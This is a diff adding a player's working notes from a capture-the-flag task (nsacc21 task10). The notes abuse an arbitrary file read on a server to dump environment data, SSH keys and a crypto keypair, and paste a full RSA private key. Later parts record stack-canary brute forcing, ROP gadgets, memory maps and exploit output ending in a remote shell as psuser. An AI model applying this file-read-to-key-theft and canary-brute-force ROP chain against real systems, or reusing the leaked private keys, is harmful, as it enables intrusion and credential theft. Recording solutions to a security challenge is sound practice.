@@ -1,0 +1,351 @@
+we can list the contents of any directory in the filesystem with get_task_ids()
+
+apparently not *any*, reading /etc maybe crashes the server?
+
+/proc/self works
+
+we can also read arbitrary files with get_task_for_id()
+
+we are running as lpuser
+
+current dir is /hoem/lpuser/lp
+
+/proc/self/env:
+LANG=C.UTF-8\x00PWD=/home/lpuser/lp\x00HOME=/home/lpuser\x00SHELL=/bin/sh\x00SHLVL=1\x00LOGNAME=lpuser\x00PATH=/usr/bin:/bin\x00_=/usr/bin/python3\x00OLDPWD=/home/lpuser\x00
+
+/proc/self/cmdline:
+python3\x00lp.py\x00
+
+trying to get /home/lpuser/lp/lp.py fails :(
+
+[+] directory contents for /home/lpuser:
+    .gnupg
+    .bash_logout
+    lp
+    .cache
+    .ssh
+    .profile
+    .selected_editor
+    .bashrc
+    .lesshst
+    .local
+
+[+] directory contents for /home/lpuser/lp:
+    __pycache__
+    protocol.json
+    runLp.sh
+    protocol.py
+    lpcrypt.py
+    lp.py
+    commands.py
+
+[+] directory contents for /home/lpuser/.ssh:
+    id_rsa.pub
+    authorized_keys
+    id_rsa
+
+[*] contents of /home/lpuser/.ssh/id_rsa.pub: b'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIQFwf+VdTD5yakmraxbXdftO74bLDOtXw0L4NFuVEl3Xh2DIQrevDdYv6dMn6ORQv4IMCZK/tSUWWEHH24SNtjR4ql8U2BCsG1Rfz+5UKrHzvrNrT3K9r1xbvJY0H+BM9L3iRcn4x3QBMVhmwYiEp1oV4XonTq70iXeQ3JyS/WYE7S0HKgXA9CXB7tKnjy9wetD3267XsW+KKFZLnLZjfVyHrM8USGbb2ztWMoVZFstygXIRDBYnErjwQ+T2DdzkoH5kbpsttc+0Myi/GRsZ7c4Hqe2O9KfJEhVOOLlzGpDTQbKuz6Q8hmTKppD6GyyyhtRyxYtQwy4pVju+/FXkz root@ip-10-115-54-51\n'
+
+couldn't get /home/lpuser/.ssh/id_rsa lmao
+
+[*] contents of /home/lpuser/.ssh/authorized_keys: b'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIQFwf+VdTD5yakmraxbXdftO74bLDOtXw0L4NFuVEl3Xh2DIQrevDdYv6dMn6ORQv4IMCZK/tSUWWEHH24SNtjR4ql8U2BCsG1Rfz+5UKrHzvrNrT3K9r1xbvJY0H+BM9L3iRcn4x3QBMVhmwYiEp1oV4XonTq70iXeQ3JyS/WYE7S0HKgXA9CXB7tKnjy9wetD3267XsW+KKFZLnLZjfVyHrM8USGbb2ztWMoVZFstygXIRDBYnErjwQ+T2DdzkoH5kbpsttc+0Myi/GRsZ7c4Hqe2O9KfJEhVOOLlzGpDTQbKuz6Q8hmTKppD6GyyyhtRyxYtQwy4pVju+/FXkz root@ip-10-115-54-51\n'
+
+feels like they want me to get the priv key though...
+
+[+] directory contents for /home:
+    local.adm
+    ssm-user
+    ubuntu
+    lpuser
+    psuser
+
+[*] contents of /home/lpuser/lp/protocol.json: b'{"s": 370589565, "e": 4013628351, "b": 26880, "priv": "4bd0e942f5075301f59569c95a19afed30f492636e7853c3b323f5f9fef7a504", "pub": "b8e84cc9cded282df1f9fd129c8140202b78dafed2f6038800e4d004f03dc11d"}\n'
+
+[*] contents of /home/lpuser/lp/runLp.sh: b'#!/bin/bash\n\n\necho "LP Loop -- Start"\nsleep 30\n\ncd /home/lpuser/lp/\nwhile [ 1 ]\ndo\n\tif [ -f "/tmp/stop_lp" ]; then\n\t\techo "LP -- Break"\n\t\tbreak\n\tfi\t\n\techo "LP -- Start"\n\tpython3 lp.py\n\tsleep 10\ndone\n\necho "LP Loop -- Exit"\n\n'
+
+protocol.py fails. so does lpcrypt.py, and lp.py
+    i think they are too long
+
+[*] contents of /home/lpuser/lp/commands.py: b"COMMAND_TYPES = [ 'register',\n                  'init',\n                  'tasking_dir',\n                  'dir_list',\n                  'file_download',\n                  'file_upload',\n                  'fin'\n                ]\nclass CommandKey():\n    def __init__(self):\n        self.key = dict()\n        for idx,cmd in enumerate(COMMAND_TYPES):\n            self.key[cmd] = idx + 1\n\n"
+
+[*] contents of /home/lpuser/.lesshst: b'.less-history-file:\n.search\n"reboot\n"-c\n'
+
+[+] directory contents for /home/psuser:
+    ps_server.log
+    runPs.sh
+    .bash_logout
+    ps_data.log
+    powershell_lp
+    .bash_history
+    .ssh
+    .profile
+    .selected_editor
+    pslp.log
+    .bashrc
+
+[*] contents of /home/psuser/runPs.sh: b'#!/bin/bash\n\necho "Powershell LP Loop -- Start"\nsleep 30\ncd /home/psuser/\nwhile [ 1 ]\ndo\n\tif [ -f "/tmp/stop_ps" ]; then\n\t\techo "Powershell LP -- Break"\n\t\tbreak\n\tfi\t\n\techo "Powershell LP -- Start"\n\t./powershell_lp \n\tsleep 10\ndone\n\necho "Powershell LP Loop -- Exit"\n\n'
+
+[*] contents of /home/psuser/pslp.log: b'Powershell LP Loop -- Start\nPowershell LP -- Start\n'
+
+[*] contents of /home/psuser/.profile: b'# ~/.profile: executed by the command interpreter for login shells.\n# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login\n# exists.\n# see /usr/share/doc/bash/examples/startup-files for examples.\n# the files are located in the bash-doc package.\n\n# the default umask is set in /etc/profile; for setting the umask\n# for ssh logins, install and configure the libpam-umask package.\n#umask 022\n\n# if running bash\nif [ -n "$BASH_VERSION" ]; then\n    # include .bashrc if it exists\n    if [ -f "$HOME/.bashrc" ]; then\n\t. "$HOME/.bashrc"\n    fi\nfi\n\n# set PATH so it includes user\'s private bin if it exists\nif [ -d "$HOME/bin" ] ; then\n    PATH="$HOME/bin:$PATH"\nfi\n\n# set PATH so it includes user\'s private bin if it exists\nif [ -d "$HOME/.local/bin" ] ; then\n    PATH="$HOME/.local/bin:$PATH"\nfi\n'
+
+[+] directory contents for /etc/ssh:
+    ssh_host_rsa_key.pub
+    ssh_host_ed25519_key
+    ssh_host_dsa_key
+    ssh_host_rsa_key
+    ssh_host_ecdsa_key
+    ssh_config
+    ssh_host_ecdsa_key.pub
+    moduli
+    sshd_config
+    ssh_host_ed25519_key.pub
+    ssh_import_id
+    ssh_host_dsa_key.pub
+
+[*] contents of /etc/lsb-release: b'DISTRIB_ID=Ubuntu\nDISTRIB_RELEASE=18.04\nDISTRIB_CODENAME=bionic\nDISTRIB_DESCRIPTION="Ubuntu 18.04.5 LTS"\n'
+
+[*] contents of /etc/crontab: b"# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user\tcommand\n17 *\t* * *\troot    cd / && run-parts --report /etc/cron.hourly\n25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n#\n"
+
+the 5 "real" bots don't have any uploads or tasking
+
+geech@zw-pc-win:~/ctf/nsacc21/task10$ sudo nmap -A -T4 34.201.33.112 -Pn
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-13 22:35 EDT
+Nmap scan report for ec2-34-201-33-112.compute-1.amazonaws.com (34.201.33.112)
+Host is up (0.019s latency).
+Not shown: 997 filtered ports
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 80:a2:5a:c3:18:cb:37:c4:4d:b1:9f:9a:8e:57:9a:67 (RSA)
+|   256 0a:c7:09:3a:f5:92:90:e9:d6:47:37:92:04:d0:75:90 (ECDSA)
+|_  256 c0:23:87:9a:b1:40:a4:36:11:95:19:1d:a9:4f:9b:d2 (ED25519)
+6666/tcp open  irc?
+|_irc-info: Unable to open connection
+8080/tcp open  http-proxy?
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 2.6.32 (93%), Linux 3.10 - 4.11 (93%), Linux 3.2 - 4.9 (93%), Linux 3.4 - 3.10 (93%), Linux 2.6.32 - 3.10 (92%), Linux 2.6.32 - 3.13 (92%), Synology DiskStation Manager 5.2-5644 (91%), Linux 2.6.22 - 2.6.36 (89%), Linux 3.10 (89%), Linux 2.6.39 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 19 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 8080/tcp)
+HOP RTT      ADDRESS
+1   0.09 ms  zw-pc-win (172.17.0.1)
+2   5.50 ms  10.0.0.1
+3   ...
+4   18.93 ms 24.124.181.109
+5   ... 6
+7   27.04 ms 68.85.133.137
+8   15.96 ms be-31421-cs02.ashburn.va.ibone.comcast.net (96.110.40.21)
+9   16.33 ms be-2211-pe11.ashburn.va.ibone.comcast.net (96.110.32.126)
+10  ... 18
+19  20.47 ms ec2-34-201-33-112.compute-1.amazonaws.com (34.201.33.112)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 210.32 seconds
+
+i am 100% supposed to SSH into this thing
+hell yeah
+
+lpuser id_rsa:
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAyEBcH/lXUw+cmpJq2sW13X7Tu+GywzrV8NC+DRblRJd14dgy
+EK3rw3WL+nTJ+jkUL+CDAmSv7UlFlhBx9uEjbY0eKpfFNgQrBtUX8/uVCqx876za
+09yva9cW7yWNB/gTPS94kXJ+Md0ATFYZsGIhKdaFeF6J06u9Il3kNyckv1mBO0tB
+yoFwPQlwe7Sp48vcHrQ99uu17FviihWS5y2Y31ch6zPFEhm29s7VjKFWRbLcoFyE
+QwWJxK48EPk9g3c5KB+ZG6bLbXPtDMovxkbGe3OB6ntjvSnyRIVTji5cxqQ00Gyr
+s+kPIZkyqaQ+hsssobUcsWLUMMuKVY7vvxV5MwIDAQABAoIBAQCCYVUaBFAU5n9C
+LL6hvkSQ+DiHhYXMkwwkhOSYxSV1KWA5MXg3X+W3F1uSMGQpJOy912G1NzVMO36x
+G/f3k9JrS4wuky514vTYt/mmg1Eg5/lYW6UGeBNHFX37KunOHHj6R2Qq3u7HLGs7
+SHvlWZ7aDLBOFM+MH68/Jv6l4jiM1GLFpx8ibFD5Aw2YGDOgmAoIDosMyAblmjj9
+cPCWzlkUfuw3A5qRLTczY2ifbQ6jcd1PCpC7tr3zhwxB23TwdJVTjdCum9Ww8+9w
+JbBxwQ3v+8yyWK5LvOoAAvNenfPJBROqbSkExXuELHPYuQM3sPyORmfDzJXzlIdA
+aV9nfXkBAoGBAP/KRtVDmcnEbSMslnHFz0p+G4Oo1UorWZZN8jrLD2q6mYuFUPnQ
+0YeulS/+3XTsWdpM8JjxLuCWkK0DHdWENqJfdADdOy+y4wkTq4WfYDLUFfZF/3oj
+er/ELBWUpsdfYuzz8T2pOXTF1nE7rpSN14G9CprejEjqVzSEUEDAY3nBAoGBAMhq
+ax6DBT5b+wr+zz44SmEH0jJV8MUQsCL78YkwAbgaipZTjWxTY83k5K5ncSubsxHM
+mdEl5q5+fb6c7HCsRQerk+UnwEKI9s7m+4D8jAigXAqgsjFBl4x2+88hRktW2+65
+I9P5ZG1XC5oNtcHe0Q+Oy4QslsVA8akSvnZzPKfzAoGAYk/3m55o7IDfxaYsiLwT
+qTkBEECDAgfZXgjFck17tnTT8Skjb3EQJ4s1cgYOThNNkbcCvnXso4ubPbQ18kvn
+x87SQkbFqdaipml2Aly4V7DmZAqRX/tlAXG/0+eXloeV+SblcOKq37PucQUUW6qM
+yyPCgLXKy3euXtQAGHMZiMECgYAlU5yrzB835A23mImkvvsrYzeE5Hi5W0hS27W6
+pVRMo7TYFquqV0WpXU4yJVXwl0kcsYycZYC3Uxu8WqG2wn8A1LXw4hxux++fzWle
+NqsmGCfMWu2VOvAs2yQ/CaV79qtzpMvFeRd5PdMNWCxX9VXenevNrDhQeK4JnVIX
+4ZKUfQKBgGXTs7i598+2bAkOLcNue0HdAi0zoC1xgn778/GeEWK5z5XRa4l8h/Z+
+OaMd0tkosB0Uph6oNEnFHpbEMGVYwcuMmMPYm72c05Q2OY4284h01F4pAWQlFYFa
+SEXIxxZYAHyUewWPf4z6+xv2QjhBZwE1zJNMufaTOBLL0tX3x2/W
+-----END RSA PRIVATE KEY-----
+
+lp.tar.gz and lp/ are from the server
+
+so is psuser.tar.gz
+
+psuser is running the powershell_lp binary. i guarentee there is a vuln in that binary, and i pop a shell on that (which is exposed on the server, 8080/tcp), which lets me get a shell as psuser and then i can check .bash_history
+
+--------------------------------
+
+rev notes
+
+ps_lp_debug/strace_out.48347 is parent process, .48362 is the child
+
+server sends your data back to you
+
+reads one byte at a time, and then reads Content-Length header value bytes
+i bet i can oob read that, leak a stack cookie.
+since it forks i think the cookie will be the same, can leak and then rop
+
+free syscalls:
+mov eax, 0x14 ; syscall
+mov eax, 0x15 ; syscall
+mov eax, 0x18 ; syscall
+mov eax, 0x19 ; syscall
+mov eax, 0x1c ; syscall
+mov eax, 0x26 ; syscall
+mov eax, 0x27 ; syscall
+mov eax, 0x29 ; syscall
+mov eax, 0x2b ; syscall
+mov eax, 0x2c ; syscall
+mov eax, 0x2d ; syscall
+mov eax, 0x31 ; syscall
+mov eax, 0x32 ; syscall
+mov eax, 0x36 ; syscall
+mov eax, 0x38 ; syscall
+mov eax, 0x3d ; syscall
+mov eax, 0x48 ; syscall
+mov eax, 0x4a ; syscall
+mov eax, 0x63 ; syscall
+mov eax, 0x66 ; syscall
+mov eax, 0x68 ; syscall
+mov eax, 0x6b ; syscall
+mov eax, 0x6c ; syscall
+mov eax, 0xa ; syscall
+mov eax, 0xb ; syscall
+mov eax, 0xba ; syscall
+mov eax, 0xc9 ; syscall
+mov eax, 0xca ; syscall
+mov eax, 0xe ; syscall
+mov eax, 0xe5 ; syscall
+mov eax, 0xea ; syscall
+
+reg gadgets:
+0x000000000000877f : pop rax ; ret
+0x0000000000008876 : pop rdi ; ret
+0x0000000000008874 : pop rsi ; pop r15 ; ret
+0x000000000001cca2 : pop rdx ; ret
+
+base address for debugging: 7ffff7d13000
+
+sys_recvfrom call 1:
+    sys_recvfrom(0x6, 0x...cf10, 0x19, 0) = 5
+
+call 2:
+    sys_recvfrom(0x6, 0x...cf15, 0x19, 0) = 5
+
+exploit chain
+    overwriting buf in handle_conn, can brute force
+    length sent back, is it # bytes recv'd or my content-length header val which gets trunc'd to max buf?
+
+crash at 0x00007FFFF7D2AA25
+
+how to detect fault?
+    bad idea: check the log, look for segfault
+
+    when it smashes the stack, there is no FIN/ACK packet sent, just an ACK and then RST/ACK
+    use scapy asyncsniff to capture packets and check if one of them has a FIN flag bit set. this is super stupid i think
+
+0xadd47aa23a5f6000
+
+regs b/f executing rop chain:
+
+ RAX  0x0
+ RBX  0x7ffff7fef000 ◂— 0x83d500000006
+ RCX  0x7ffff7d6a4d1 ◂— cmp    rax, -0x1000 /* 'H=' */
+ RDX  0x1008
+ RDI  0x4
+ RSI  0x7fffffffcf10 ◂— 0x6161616161616161 ('aaaaaaaa')
+ R8   0x0
+ R9   0x29
+ R10  0x0
+ R11  0x246
+ R12  0x7ffff7d1d860 ◂— push   rbp
+ R13  0x0
+ R14  0x0
+ R15  0x0
+ RBP  0x7fffffffdfa0 —▸ 0x7fffffffdfd0 —▸ 0x7ffff7d1d7c0 ◂— push   r15
+ RSP  0x7fffffffdf38 —▸ 0x7ffff7d1c95f ◂— mov    rax, qword ptr [rip + 0x2dfa62]
+ RIP  0x7ffff7d1c7bf ◂— ret
+
+rsi is pointing to some part of our buffer
+rcx is pointing to code
+
+no-aslr map:
+    0x7ffff7d13000     0x7ffff7df7000 r-xp    e4000 0      /mnt/hgfs/ctf/nsacc21/task10/psuser/powershell_lp
+    0x7ffff7fef000     0x7ffff7ff0000 rw-p     1000 0      /dev/zero (deleted)
+    0x7ffff7ff0000     0x7ffff7ff4000 r--p     4000 0      [vvar]
+    0x7ffff7ff4000     0x7ffff7ff6000 r-xp     2000 0      [vdso]
+    0x7ffff7ff6000     0x7ffff7ffd000 rw-p     7000 e3000  /mnt/hgfs/ctf/nsacc21/task10/psuser/powershell_lp
+    0x7ffff7ffd000     0x7ffff8022000 rw-p    25000 0      [heap]
+    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]
+0xffffffffff600000 0xffffffffff601000 --xp     1000 0      [vsyscall]
+
+with aslr map:
+geech@zw-pc-win:~/ctf/nsacc21/task10/psuser$ cat /proc/19706/maps
+555557142000-555557165000 rw-p 00000000 00:00 0                          [heap]
+7fbd10888000-7fbd1096c000 r-xp 00000000 00:2c 281474977562931            /mnt/d/MDE_EXCL/ctf/nsacc21/task10/psuser/powershell_lp
+7fbd10b6a000-7fbd10b6b000 rw-s 00000000 00:01 88142775                   /dev/zero (deleted)
+7fbd10b6b000-7fbd10b72000 rw-p 000e3000 00:2c 281474977562931            /mnt/d/MDE_EXCL/ctf/nsacc21/task10/psuser/powershell_lp
+7fbd10b72000-7fbd10b74000 rw-p 00000000 00:00 0
+7ffd66031000-7ffd66052000 rw-p 00000000 00:00 0                          [stack]
+7ffd66187000-7ffd6618a000 r--p 00000000 00:00 0                          [vvar]
+7ffd6618a000-7ffd6618b000 r-xp 00000000 00:00 0                          [vdso]
+
+
+
+geech@zw-pc-win:~/ctf/nsacc21/task10$ ./ps_lp_exp.py 
+[*] bruteforcing canary
+[*] got another byte: 0xc200
+[*] got another byte: 0x89c200
+[*] got another byte: 0xc389c200
+[*] got another byte: 0x59c389c200
+[*] got another byte: 0x2b59c389c200
+[*] got another byte: 0x52b59c389c200
+[*] got another byte: 0x51052b59c389c200
+[+] got full canary: 0x51052b59c389c200
+[*] bruteforcing rbp
+[*] got another byte: 0x4d
+[*] got another byte: 0x4d
+[*] got another byte: 0x4d
+[*] got another byte: 0x6b00004d
+[*] got another byte: 0xfc6b00004d
+[+] leaked rbp: 0x7ffc6b00004d
+[*] bruteforcing rip
+[*] got another byte: 0x195f
+[*] got another byte: 0x34195f
+[*] got another byte: 0xe334195f
+[*] got another byte: 0x7ce334195f
+[+] leaked rip: 0x7f7ce334195f
+[*] base addr: 0x7f7ce3338000
+[+] Opening connection to 52.91.233.249 on port 8080: Done
+[*] Switching to interactive mode
+$ id
+uid=1004(psuser) gid=1004(psuser) groups=1004(psuser)
+$ ls
+powershell_lp
+ps_data.log
+ps_server.log
+pslp.log
+runPs.sh
+$ cat .bash_history
+ls -la
+date
+wc ps_*
+less ps_data.log
+less ps_server.log
+man scp
+scp -P 30166 ~/ps_data.log nexthop:
+$ cat .ssh/config
+Host nexthop
+    Hostname: 10.191.101.94
+    User: user
+    IdentityFile: /home/psuser/.ssh/id_rsa
